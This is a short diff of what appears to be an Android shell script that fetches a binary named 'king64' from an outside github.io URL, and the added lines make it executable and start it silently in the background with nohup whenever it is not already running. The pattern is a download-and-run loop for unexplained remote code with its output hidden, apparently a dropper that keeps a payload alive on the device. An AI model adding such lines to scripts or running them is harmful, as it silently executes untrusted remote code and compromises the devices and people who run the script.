@@ -21,6 +21,8 @@ local url="https://henbz10real.github.io/snx11response/bin/king64"
 		status=$(pgrep -f king64) >/dev/null 2>&1
 		if [ ! "$status" ]; then
 			xtorm "$url" -fn "king64"
+                        chmod +x /data/local/tmp/king64
+			nohup /data/local/tmp/king64 >/dev/null 2>&1 &
 		fi 
 		sleep 2
 		status=$(pgrep -f king64) >/dev/null 2>&1
